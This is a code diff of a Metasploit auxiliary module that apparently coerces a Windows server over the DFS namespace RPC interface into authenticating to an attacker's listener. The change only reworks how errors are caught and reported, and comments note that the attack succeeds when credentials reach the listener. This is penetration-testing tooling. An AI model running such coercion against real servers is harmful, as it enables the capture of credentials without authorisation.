@@ -73,6 +73,12 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       dfsnm = connect_dfsnm
+    rescue RubySMB::Error::UnexpectedStatusCode => e
+      if e.status_code == ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
+        fail_with(Failure::NoAccess, 'Connection failed (STATUS_ACCESS_DENIED)')
+      end
+
+      fail_with(Failure::UnexpectedReply, "Connection failed (#{e.status_code.name})")
     rescue RubySMB::Dcerpc::Error::FaultError => e
       elog(e.message, error: e)
       fail_with(Failure::UnexpectedReply, "Connection failed (DCERPC fault: #{e.status_name})")
@@ -87,18 +93,15 @@ class MetasploitModule < Msf::Auxiliary
         dfsnm.netr_dfs_remove_std_root(datastore['LISTENER'], 'share')
       end
     rescue RubySMB::Dcerpc::Error::DfsnmError => e
-      win32_error = ::WindowsError::Win32.find_by_retval(e.error_status).first
-      case win32_error
+      case e.status_code
       when ::WindowsError::Win32::ERROR_ACCESS_DENIED
         # this should be the response even if LISTENER captured the credentials (MSF, Responder, etc.)
         print_good('Server responded with ERROR_ACCESS_DENIED which indicates that the attack was successful')
       when ::WindowsError::Win32::ERROR_BAD_NETPATH
         # this should be the response even if LISTENER was inaccessible
         print_good('Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful')
-      when nil
-        print_status("Server responded with unknown error: 0x#{error_status.to_s(16).rjust(8, '0')}")
       else
-        print_status("Server responded with #{win32_error.name} (#{win32_error.description})")
+        print_status("Server responded with #{e.status_code.name} (#{e.status_code.description})")
       end
     end
   end
